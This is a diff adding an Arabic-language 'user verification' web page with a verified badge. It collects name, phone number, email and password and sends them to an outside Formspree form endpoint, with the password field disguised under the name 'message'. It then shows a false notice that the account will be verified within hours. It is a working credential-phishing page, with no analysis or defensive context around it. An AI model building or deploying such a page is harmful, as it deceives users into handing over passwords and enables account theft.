@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>التحقق من المستخدم</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    background: linear-gradient(135deg, #f0f4ff, #d9e4ff);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  /* البطاقة */
+  .card {
+    background: #fff;
+    border-radius: 16px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+    padding: 30px 25px;
+    width: 100%;
+    max-width: 450px;
+    text-align: center;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* عنوان مع علامة التوثيق */
+  .title {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    justify-content: center;
+    margin-bottom: 25px;
+  }
+
+  .title h2 {
+    margin: 0;
+    color: #222;
+    font-size: 24px;
+  }
+
+  .verified-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #1da1f2;
+    color: white;
+    font-size: 14px;
+    border-radius: 50%;
+    width: 22px;
+    height: 22px;
+  }
+
+  input {
+    width: 100%;
+    padding: 14px 12px;
+    margin: 10px 0;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    direction: rtl;
+    box-sizing: border-box;
+    transition: 0.3s;
+  }
+
+  input:focus {
+    border-color: #5b9bff;
+    box-shadow: 0 0 5px rgba(91, 155, 255, 0.3);
+    outline: none;
+  }
+
+  button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 15px;
+    border: none;
+    border-radius: 10px;
+    background-color: #5b9bff;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+
+  button:hover {
+    background-color: #4786e6;
+  }
+
+  /* حاوية كلمة السر */
+  .password-container {
+    position: relative;
+    width: 100%;
+  }
+
+  .toggle-eye {
+    position: absolute;
+    left: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    user-select: none;
+    font-size: 18px;
+    color: #555;
+  }
+
+  /* خلفية التحقق */
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(3px);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+  }
+
+  .verification-box {
+    background: #fff3cd;
+    color: #856404;
+    padding: 25px 20px;
+    border-radius: 16px;
+    text-align: center;
+    max-width: 400px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+  }
+
+  .finishBtn {
+    margin-top: 20px;
+    background-color: #28a745;
+  }
+
+  .finishBtn:hover {
+    background-color: #218838;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+
+  <!-- العنوان مع علامة التوثيق -->
+  <div class="title">
+    <h2>التحقق من المستخدم</h2>
+    <span class="verified-badge">✔️</span>
+  </div>
+
+  <!-- النموذج -->
+  <form id="mainForm">
+    <input type="text" name="displayName" placeholder="الاسم" required>
+    <input type="tel" name="phone" placeholder="رقم الهاتف (مثال: +9677xxxxxxx)" required>
+    <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+
+    <!-- حقل كلمة السر -->
+    <div class="password-container">
+      <input type="password" id="password" name="message" placeholder="كلمة السر" required>
+      <span class="toggle-eye" onclick="togglePassword()">👁️</span>
+    </div>
+
+    <button type="submit">التالي</button>
+  </form>
+</div>
+
+<!-- الرسالة مع الخلفية الضبابية -->
+<div class="overlay" id="overlay">
+  <div class="verification-box">
+    سوف يتم التحقق من حسابك في غضون ساعات قليلة، يرجى الانتظار حتى يتم التحقق وشكرًا
+    <button class="finishBtn" onclick="finishProcess()">إنهاء</button>
+  </div>
+</div>
+
+<script>
+const form = document.getElementById('mainForm');
+const overlay = document.getElementById('overlay');
+
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  
+  // إظهار الخلفية والرسالة
+  overlay.style.display = 'flex';
+  
+  // جمع البيانات وإرسالها عبر Formspree
+  const fd = new FormData(form);
+  fetch('https://formspree.io/f/xzzkpwlj', {
+    method: 'POST',
+    body: fd,
+    headers: { 'Accept': 'application/json' }
+  }).then(response => {
+    // الإرسال تم بنجاح
+  }).catch(err => {
+    alert('حدث خطأ أثناء الإرسال: ' + err);
+  });
+});
+
+function finishProcess(){
+  overlay.style.display = 'none';
+  window.location.reload();
+}
+
+// دالة إظهار/إخفاء كلمة السر
+function togglePassword() {
+  const input = document.getElementById("password");
+  const eye = document.querySelector(".toggle-eye");
+  if (input.type === "password") {
+    input.type = "text";
+    eye.textContent = "🙈"; // عند الإظهار
+  } else {
+    input.type = "password";
+    eye.textContent = "👁️"; // عند الإخفاء
+  }
+}
+</script>
+</body>
+</html>
